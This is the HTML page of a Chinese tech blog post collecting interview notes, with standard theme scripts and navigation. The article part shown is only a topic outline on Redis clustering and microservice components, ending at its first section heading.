<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><div id="myscoll"></div><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>面试篇 | August's Blog</title><meta name="keywords" content="面试"><meta name="author" content="August"><meta name="copyright" content="August"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="常见面试八股总结">
<meta property="og:type" content="article">
<meta property="og:title" content="面试篇">
<meta property="og:url" content="https://www.fomal.cc/posts/0.html">
<meta property="og:site_name" content="August&#39;s Blog">
<meta property="og:description" content="常见面试八股总结">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://source.fomal.cc/img/default_cover_14.webp">
<meta property="article:published_time" content="2025-06-08T15:14:43.000Z">
<meta property="article:modified_time" content="2025-06-08T14:55:28.893Z">
<meta property="article:author" content="August">
<meta property="article:tag" content="面试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://source.fomal.cc/img/default_cover_14.webp"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://www.fomal.cc/posts/0"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.js',
      css: 'https://cdnjs.cloudflare.com/ajax/libs/flickr-justified-gallery/2.1.2/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '面试篇',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-08 22:55:28'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><style id="themeColor"></style><style id="rightSide"></style><style id="transPercent"></style><style id="blurNum"></style><style id="settingStyle"></style><style id="defineBg"></style><style id="menu_shadow"></style><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-filter-gitcalendar/lib/gitcalendar.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="August's Blog" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://avatars.githubusercontent.com/u/162339994?s=400&amp;u=749fe297cbee2af83d397f99eb06d884a3f17f2e&amp;v=4" onerror="onerror=null;src='/assets/r1.jpg'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--article"></use></svg><span class="menu_word" style="font-size:17px"> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1">                   </use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-sekuaibiaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-pinweishenghuo"></use></svg><span class="menu_word" style="font-size:17px"> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/life/music/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-yinle">                   </use></svg><span class="menu_word" style="font-size:17px"> 八音盒</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/movies/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-dianying1">                   </use></svg><span class="menu_word" style="font-size:17px"> 影院</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/games/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-youxishoubing">                   </use></svg><span class="menu_word" style="font-size:17px"> 游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> 八宝箱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/gallery/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-tubiaozhizuomoban">                   </use></svg><span class="menu_word" style="font-size:17px"> 画廊</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/animation/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-nvwumao">                   </use></svg><span class="menu_word" style="font-size:17px"> 动画</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> 网址导航</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shejiaoxinxi"></use></svg><span class="menu_word" style="font-size:17px"> 社交</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/social/fcircle/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-pengyouquan">                   </use></svg><span class="menu_word" style="font-size:17px"> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyan">                   </use></svg><span class="menu_word" style="font-size:17px"> 留言板</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-lianjie">                   </use></svg><span class="menu_word" style="font-size:17px"> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wangye"></use></svg><span class="menu_word" style="font-size:17px"> 网站</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/census/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--tongjibiao">                   </use></svg><span class="menu_word" style="font-size:17px"> 网站统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/echarts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shujutongji1">                   </use></svg><span class="menu_word" style="font-size:17px"> 文章统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/time/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xianxingshalou">                   </use></svg><span class="menu_word" style="font-size:17px"> 旧时光</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maoliang"></use></svg><span class="menu_word" style="font-size:17px"> 个人</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-qunliaotian">                   </use></svg><span class="menu_word" style="font-size:17px"> 唠叨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/love/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-love-sign">                   </use></svg><span class="menu_word" style="font-size:17px"> 恋爱小屋</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-paperplane">                   </use></svg><span class="menu_word" style="font-size:17px"> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">August's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-home"></use></svg><span class="menu_word" style="font-size:17px"> 首页</span></a></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--article"></use></svg><span class="menu_word" style="font-size:17px"> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-guidang1">                   </use></svg><span class="menu_word" style="font-size:17px"> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-sekuaibiaoqian">                   </use></svg><span class="menu_word" style="font-size:17px"> 标签</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-fenlei">                   </use></svg><span class="menu_word" style="font-size:17px"> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-pinweishenghuo"></use></svg><span class="menu_word" style="font-size:17px"> 休闲</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/life/music/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-yinle">                   </use></svg><span class="menu_word" style="font-size:17px"> 八音盒</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/movies/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-dianying1">                   </use></svg><span class="menu_word" style="font-size:17px"> 影院</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/life/games/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-youxishoubing">                   </use></svg><span class="menu_word" style="font-size:17px"> 游戏</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xiangzi"></use></svg><span class="menu_word" style="font-size:17px"> 八宝箱</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/box/gallery/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-tubiaozhizuomoban">                   </use></svg><span class="menu_word" style="font-size:17px"> 画廊</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/animation/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-nvwumao">                   </use></svg><span class="menu_word" style="font-size:17px"> 动画</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/box/nav/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-zhifengche">                   </use></svg><span class="menu_word" style="font-size:17px"> 网址导航</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shejiaoxinxi"></use></svg><span class="menu_word" style="font-size:17px"> 社交</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/social/fcircle/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-pengyouquan">                   </use></svg><span class="menu_word" style="font-size:17px"> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-liuyan">                   </use></svg><span class="menu_word" style="font-size:17px"> 留言板</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/social/link/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-lianjie">                   </use></svg><span class="menu_word" style="font-size:17px"> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-wangye"></use></svg><span class="menu_word" style="font-size:17px"> 网站</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/site/census/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon--tongjibiao">                   </use></svg><span class="menu_word" style="font-size:17px"> 网站统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/echarts/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-shujutongji1">                   </use></svg><span class="menu_word" style="font-size:17px"> 文章统计</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/site/time/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-xianxingshalou">                   </use></svg><span class="menu_word" style="font-size:17px"> 旧时光</span></a></li></ul></div><div class="menus_item"><a class="site-page group faa-parent animated-hover hide" href="javascript:void(0);"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-maoliang"></use></svg><span class="menu_word" style="font-size:17px"> 个人</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/personal/bb/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-qunliaotian">                   </use></svg><span class="menu_word" style="font-size:17px"> 唠叨</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/love/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-love-sign">                   </use></svg><span class="menu_word" style="font-size:17px"> 恋爱小屋</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/personal/about/"><svg class="menu_icon faa-tada" aria-hidden="true" style="width:1.30em;height:1.30em;vertical-align:-0.15em;fill:currentColor;overflow:hidden;"><use xlink:href="#icon-paperplane">                   </use></svg><span class="menu_word" style="font-size:17px"> 关于</span></a></li></ul></div></div><center id="name-container"><a id="page-name" href="javascript:scrollToTop()">PAGE_NAME</a></center><div id="nav-right"><div id="search-button"><a class="search faa-parent animated-hover" title="检索站内任何你想要的信息"><svg class="faa-tada icon" style="height:24px;width:24px;fill:currentColor;position:relative;top:6px" aria-hidden="true"><use xlink:href="#icon-valentine_-search-love-find-heart"></use></svg><span> 搜索</span></a></div><a class="meihua faa-parent animated-hover" onclick="toggleWinbox()" title="美化设置-自定义你的风格" id="meihua-button"><svg class="faa-tada icon" style="height:26px;width:26px;fill:currentColor;position:relative;top:8px" aria-hidden="true"><use xlink:href="#icon-tupian1"></use></svg></a><a class="sun_moon faa-parent animated-hover" onclick="switchNightMode()" title="浅色和深色模式转换" id="nightmode-button"><svg class="faa-tada" style="height:25px;width:25px;fill:currentColor;position:relative;top:7px" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon">       </use></svg></a><div id="toggle-menu"><a><i class="fas fa-bars fa-fw"></i></a></div></div></div></nav><div id="post-info"><h1 class="post-title">面试篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><svg class="meta_icon post-meta-icon" style="width:30px;height:30px;position:relative;top:10px"><use xlink:href="#icon-rili"></use></svg><span class="post-meta-label">发表于 </span><time class="post-meta-date-created" datetime="2025-06-08T15:14:43.000Z" title="发表于 2025-06-08 23:14:43">2025-06-08</time><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-gengxin1"></use></svg><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-08T14:55:28.893Z" title="更新于 2025-06-08 22:55:28">2025-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:18px;height:18px;position:relative;top:5px"><use xlink:href="#icon-biaoqian"></use></svg><a class="post-meta-categories" href="/categories/August%E7%9A%84%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/">August的面试总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:8px"><use xlink:href="#icon-charuword"></use></svg><span class="post-meta-label">字数总计:</span><span class="word-count">11w</span><span class="post-meta-separator">|</span><svg class="meta_icon post-meta-icon" style="width:20px;height:20px;position:relative;top:5px"><use xlink:href="#icon-shizhong"></use></svg><span class="post-meta-label">阅读时长:</span><span>367分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="面试篇"><svg class="meta_icon post-meta-icon" style="width:25px;height:25px;position:relative;top:5px"><use xlink:href="#icon-eye"></use></svg><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>接下来的内容主要包括以下几方面：</p>
<p>Redis高级：</p>
<ul>
<li>Redis主从</li>
<li>Redis哨兵</li>
<li>Redis分片集群</li>
<li>Redis数据结构</li>
<li>Redis内存回收</li>
<li>Redis缓存一致性</li>
</ul>
<p>微服务高级：</p>
<ul>
<li>Eureka和Nacos对比</li>
<li>Ribbon和SpringCloudLoadBalancer</li>
<li>Hystix和Sentinel</li>
<li>限流算法</li>
</ul>
<h1>Redis面试篇</h1>
<h2 id="搭建主从集群">搭建主从集群</h2>
